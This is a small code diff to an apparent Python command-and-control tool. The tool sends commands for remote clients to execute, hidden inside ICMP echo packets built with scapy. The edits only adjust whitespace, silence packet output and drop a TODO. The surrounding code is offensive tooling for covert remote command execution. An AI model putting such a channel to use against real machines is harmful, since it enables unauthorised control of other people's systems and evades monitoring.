@@ -8,7 +8,7 @@ import threading
 DEBUG = True                   # Set to display statements after command execution
 DEVDEBUG = False               # Set to display statements specific to debugging issues
 JSONFILE = "example.json"      # Set to point to configuration files with loadclients
-SuperSecretMode = False         # Enables "encryption"
+SuperSecretMode = False        # Enables "encryption"
 KEY = "B"
 CLOUD = "172"
 LAN = "10"
@@ -115,9 +115,8 @@ def send_over_icmp(clientip, command, execute):
             clientcommand = "!!!00" + command
     
     evil = IP(dst=clientip)/ICMP(type=8)/(clientcommand)
-    send(evil)
+    send(evil, verbose=False)
 
-# TODO Execute on all clients
 # Send command to all clients
 def sendtoall(arguments, clients, execute):
     global SuperSecretMode
